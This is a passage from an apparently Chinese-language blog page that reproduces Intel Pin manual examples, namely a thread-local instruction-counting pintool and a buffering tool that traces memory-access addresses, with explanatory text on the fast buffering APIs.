class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"inscount_tls.out\"</span>, <span class=\"string\">\"specify output file name\"</span>);</div><div class=\"line\"></div><div class=\"line\">PIN_LOCK lock;</div><div class=\"line\">INT32 numThreads = <span class=\"number\">0</span>;</div><div class=\"line\">ofstream OutFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Force each thread's data to be in its own data cache line so that</span></div><div class=\"line\"><span class=\"comment\">// multiple threads do not contend for the same data cache line.</span></div><div class=\"line\"><span class=\"comment\">// This avoids the false sharing problem.</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PADSIZE 56  <span class=\"comment\">// 64 byte line size: 64-8</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// a running count of the instructions</span></div><div class=\"line\"><span class=\"keyword\">class</span> <span class=\"keyword\">thread_data_t</span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">public</span>:</div><div class=\"line\">    <span class=\"keyword\">thread_data_t</span>() : <span class=\"number\">_</span>count(<span class=\"number\">0</span>) &#123;&#125;</div><div class=\"line\">    UINT64 <span class=\"number\">_</span>count;</div><div class=\"line\">    UINT8 <span class=\"number\">_</span>pad[PADSIZE];</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// key for accessing TLS storage in the threads. initialized once in main()</span></div><div class=\"line\"><span class=\"keyword\">static</span>  TLS_KEY tls_key;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// function to access thread-specific data</span></div><div class=\"line\"><span class=\"keyword\">thread_data_t</span>* get_tls(THREADID threadid)</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">thread_data_t</span>* tdata = </div><div class=\"line\">          <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">thread_data_t</span>*&gt;(PIN_GetThreadData(tls_key, threadid));</div><div class=\"line\">    <span class=\"keyword\">return</span> tdata;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every block</span></div><div class=\"line\"><span class=\"function\">VOID PIN_FAST_ANALYSIS_CALL <span class=\"title\">docount</span><span class=\"params\">(UINT32 c, THREADID threadid)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">thread_data_t</span>* tdata = get_tls(threadid);</div><div class=\"line\">    tdata-&gt;<span class=\"number\">_</span>count += c;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThreadStart</span><span class=\"params\">(THREADID threadid, CONTEXT *ctxt, INT32 flags, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_GetLock(&amp;lock, threadid+<span class=\"number\">1</span>);</div><div class=\"line\">    numThreads++;</div><div class=\"line\">    PIN_ReleaseLock(&amp;lock);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">thread_data_t</span>* tdata = <span class=\"keyword\">new</span> <span class=\"keyword\">thread_data_t</span>;</div><div class=\"line\"></div><div class=\"line\">    PIN_SetThreadData(tls_key, tdata, threadid);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new basic block is encountered.</span></div><div class=\"line\"><span class=\"comment\">// It inserts a call to docount.</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Trace</span><span class=\"params\">(TRACE trace, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Visit every basic block  in the trace</span></div><div class=\"line\">    <span class=\"keyword\">for</span> (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"comment\">// Insert a call to docount for every bbl, passing the number of instructions.</span></div><div class=\"line\">        </div><div class=\"line\">        BBL_InsertCall(bbl, IPOINT_ANYWHERE, (AFUNPTR)docount, IARG_FAST_ANALYSIS_CALL,</div><div class=\"line\">                       IARG_UINT32, BBL_NumIns(bbl), IARG_THREAD_ID, IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"Total number of threads = \"</span> &lt;&lt; numThreads &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">for</span> (INT32 t=<span class=\"number\">0</span>; t&lt;numThreads; t++)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">thread_data_t</span>* tdata = get_tls(t);</div><div class=\"line\">        OutFile &lt;&lt; <span class=\"string\">\"Count[\"</span> &lt;&lt; decstr(t) &lt;&lt; <span class=\"string\">\"]= \"</span> &lt;&lt; tdata-&gt;<span class=\"number\">_</span>count &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    OutFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool counts the number of dynamic instructions executed\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    OutFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize the lock</span></div><div class=\"line\">    PIN_InitLock(&amp;lock);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Obtain  a key for TLS storage.</span></div><div class=\"line\">    tls_key = PIN_CreateThreadDataKey(<span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register ThreadStart to be called when a thread starts.</span></div><div class=\"line\">    PIN_AddThreadStartFunction(ThreadStart, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Instruction to be called to instrument instructions.</span></div><div class=\"line\">    TRACE_AddInstrumentFunction(Trace, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits.</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Using-the-Fast-Buffering-APIs\"><a href=\"#Using-the-Fast-Buffering-APIs\" class=\"headerlink\" title=\"Using the Fast Buffering APIs\"></a>Using the Fast Buffering APIs</h1><p>Pin可以处理缓冲区数据。<br>如果分析函数近用于加载参数到缓冲区，则可使用缓冲API，减少性能开销。<br>PIN_DefineTraceBuffer()定义缓冲区，线程启动时分配缓冲区，线程退出时回收缓冲区。<br> INS_InsertFillBuffer()将请求数据直接写入给定缓冲区。<br> 当缓冲区满或线程退出时，PIN_DefineTraceBuffer()中的回调函数处理缓冲区。<br> 下例记录了所有访问内存指令的PC和这些指令的有效地址。<br> 注意：快速缓存APIs中不能使用 IARG_REG_REFERENCE, IARG_REG_CONST_REFERENCE and IARG_CONTEXT。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -t obj-ia32/buffer_linux.so -- obj-ia32/thread_lin</div><div class=\"line\">$ tail buffer.out.*.*</div><div class=\"line\"><span class=\"number\">3263</span>df   <span class=\"number\">330108</span></div><div class=\"line\"><span class=\"number\">3263</span>df   <span class=\"number\">330108</span></div><div class=\"line\"><span class=\"number\">3263</span>f1   a92f43fc</div><div class=\"line\"><span class=\"number\">3263</span>f7   a92f4d7d</div><div class=\"line\"><span class=\"number\">326404</span>   a92f43fc</div><div class=\"line\"><span class=\"number\">32640</span>a   a92f4bf8</div><div class=\"line\"><span class=\"number\">32640</span>a   a92f4bf8</div><div class=\"line\"><span class=\"number\">32640</span>f   a92f4d94</div><div class=\"line\"><span class=\"number\">32641</span>b   a92f43fc</div><div class=\"line\"><span class=\"number\">326421</span>   a92f4bf8</div></pre></td></tr></table></figure>\n<p>此例子适用于Linux平台，源码参见  source/tools/ManualExamples/buffer_linux.cpp<br>Windows用户参见 source/tools/ManualExamples/buffer_windows.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Sample buffering tool</div><div class=\"line\"> * </div><div class=\"line\"> * This tool collects an address trace of instructions that access memory</div><div class=\"line\"> * by filling a buffer.  When the buffer overflows,the callback writes all</div><div class=\"line\"> * of the collected records to a file.</div><div class=\"line\"> *</div><div class=\"line\"> */</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stddef.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"portability.H\"</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Name of the output file</div><div class=\"line\"> */</div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>, <span class=\"string\">\"o\"</span>, <span class=\"string\">\"buffer.out\"</span>, <span class=\"string\">\"output file\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * The ID of the buffer</div><div class=\"line\"> */</div><div class=\"line\">BUFFER_ID bufId;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Thread specific data</div><div class=\"line\"> */</div><div class=\"line\">TLS_KEY mlog_key;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Number of OS pages for the buffer</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> NUM_BUF_PAGES 1024</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Record of memory references.  Rather than having two separate</div><div class=\"line\"> * buffers for reads and writes, we just use one struct that includes a</div><div class=\"line\"> * flag for type.</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"keyword\">struct</span> MEMREF</div><div class=\"line\">&#123;</div><div class=\"line\">    ADDRINT     pc;</div><div class=\"line\">    ADDRINT     ea;</div><div class=\"line\">    UINT32      size;</div><div class=\"line\">    BOOL        read;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * MLOG - thread specific data that is not handled by the buffering API.</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"keyword\">class</span> MLOG</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">public</span>:</div><div class=\"line\">    MLOG(THREADID tid);</div><div class=\"line\">    ~MLOG();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\">VOID <span class=\"title\">DumpBufferToFile</span><span class=\"params\">( <span class=\"keyword\">struct</span> MEMREF * reference, UINT64 numElements, THREADID tid )</span></span>;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">private</span>:</div><div class=\"line\">    ofstream <span class=\"number\">_</span>ofile;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">MLOG::MLOG(THREADID tid)</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">string</span> filename = KnobOutputFile.Value() + <span class=\"string\">\".\"</span> + decstr(getpid_portable()) + <span class=\"string\">\".\"</span> + decstr(tid);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"number\">_</span>ofile.open(filename.c_str());</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">if</span> ( ! <span class=\"number\">_</span>ofile )</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"Error: could not open output file.\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"number\">_</span>ofile &lt;&lt; hex;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">MLOG::~MLOG()</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"number\">_</span>ofile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">VOID MLOG::DumpBufferToFile( <span class=\"keyword\">struct</span> MEMREF * reference, UINT64 numElements, THREADID tid )</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span>(UINT64 i=<span class=\"number\">0</span>; i&lt;numElements; i++, reference++)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (reference-&gt;ea != <span class=\"number\">0</span>)</div><div class=\"line\">            <span class=\"number\">_</span>ofile &lt;&lt; reference-&gt;pc &lt;&lt; <span class=\"string\">\"   \"</span> &lt;&lt; reference-&gt;ea &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**************************************************************************</span></div><div class=\"line\"> *</div><div class=\"line\"> *  Instrumentation routines</div><div class=\"line\"> *</div><div class=\"line\"> **************************************************************************/</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Insert code to write data to a thread-specific buffer for instructions</div><div class=\"line\"> * that access memory.</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Trace</span><span class=\"params\">(TRACE trace, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span>(BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl=BBL_Next(bbl))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">for</span>(INS ins = BBL_InsHead(bbl); INS_Valid(ins); ins=INS_Next(ins))</div><div class=\"line\">        &#123;</div><div class=\"line\">            UINT32 memoryOperands = INS_MemoryOperandCount(ins);</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">for</span> (UINT32 memOp = <span class=\"number\">0</span>; memOp &lt; memoryOperands; memOp++)</div><div class=\"line\">            &#123;</div><div class=\"line\">                UINT32 refSize = INS_MemoryOperandSize(ins, memOp);</div><div class=\"line\"></div><div class=\"line\">                <span class=\"comment\">// Note that if the operand is both read and written we log it once</span></div><div class=\"line\">                <span class=\"comment\">// for each.</span></div><div class=\"line\">                <span class=\"keyword\">if</span> (INS_MemoryOperandIsRead(ins, memOp))</div><div class=\"line\">                &#123;</div><div class=\"line\">                    INS_InsertFillBuffer(ins, IPOINT_BEFORE, bufId,</div><div class=\"line\">                                         IARG_INST_PTR, offsetof(<span class=\"keyword\">struct</span> MEMREF, pc),</div><div class=\"line\">                                         IARG_MEMORYOP_EA, memOp, offsetof(<span class=\"keyword\">struct</span> MEMREF, ea),</div><div class=\"line\">                                         IARG_UINT32, refSize, offsetof(<span class=\"keyword\">struct</span> MEMREF, size), </div><div class=\"line\">                                         IARG_BOOL, TRUE, offsetof(<span class=\"keyword\">struct</span> MEMREF, read),</div><div class=\"line\">                                         IARG_END);</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (INS_MemoryOperandIsWritten(ins, memOp))</div><div class=\"line\">                &#123;</div><div class=\"line\">                    INS_InsertFillBuffer(ins, IPOINT_BEFORE, bufId,</div><div class=\"line\">                                         IARG_INST_PTR, offsetof(<span class=\"keyword\">struct</span> MEMREF, pc),</div><div class=\"line\">                                         IARG_MEMORYOP_EA, memOp, offsetof(<span class=\"keyword\">struct</span> MEMREF, ea),</div><div class=\"line\">                                         IARG_UINT32, refSize, offsetof(<span class=\"keyword\">struct</span> MEMREF, size), </div><div class=\"line\">                                         IARG_BOOL, FALSE, offsetof(<span class=\"keyword\">struct</span> MEMREF, read),</div><div class=\"line\">                                         IARG_END);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**************************************************************************</span></div><div class=\"line\"> *</div><div class=\"line\"> *  Callback Routines</div><div class=\"line\"> *</div><div class=\"line\"> **************************************************************************/</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID * <span class=\"title\">BufferFull</span><span class=\"params\">(BUFFER_ID id, THREADID tid, <span class=\"keyword\">const</span> CONTEXT *ctxt, VOID *buf,</span></span></div><div class=\"line\">                  UINT64 numElements, VOID *v)</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">struct</span> MEMREF * reference=(<span class=\"keyword\">struct</span> MEMREF*)buf;</div><div class=\"line\"></div><div class=\"line\">    MLOG * mlog = <span class=\"keyword\">static_cast</span>&lt;MLOG*&gt;( PIN_GetThreadData( mlog_key, tid ) );</div><div class=\"line\"></div><div class=\"line\">    mlog-&gt;DumpBufferToFile( reference, numElements, tid );</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> buf;</div><div class=\"line\">&#125;</div><div 